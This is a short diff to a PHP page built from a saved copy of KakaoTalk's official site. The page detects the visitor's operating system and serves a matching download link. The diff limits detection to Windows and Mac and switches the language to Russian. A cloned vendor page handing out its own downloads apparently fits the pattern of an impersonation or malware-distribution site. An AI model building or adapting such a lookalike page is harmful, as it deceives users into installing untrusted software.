@@ -8,17 +8,11 @@ $links = $result;
 
 function getLinkOs() {
   $os = strtolower($_SERVER['HTTP_USER_AGENT']);
-  if (strpos($os, 'iphone') !== false || strpos($os, 'ipad') !== false) {
-    return 'apple';
-  } else if (strpos($os, 'android') !== false) {
-    return 'google';
-  } else if (strpos($os, 'windows') !== false) {
-    return 'microsoft';
+  if (strpos($os, 'windows') !== false) {
+    return 'windows';
   } else if (strpos($os, 'mac') !== false) {
-    return 'macapple';
-  } else if (strpos($os, 'micromessenger') !== false) {
-    return 'weixin';
-  }
+    return 'apple';
+  } 
   return 'unknown';
 }
 
@@ -29,7 +23,7 @@ $link = $links[$os] ?? '';
 <!DOCTYPE html>
 <!-- saved from url=(0064)https://www.kakaocorp.com/page/service/service/kakaotalk?lang=en -->
 <html
-  lang="en"
+  lang="ru"
   data-n-head="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D"
   style="
     --baseBackground: #fff;
@@ -124,6 +118,7 @@ $link = $links[$os] ?? '';
   
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
 
     <title>
       KakaoTalk, where people and the world come to get connected | Kakao
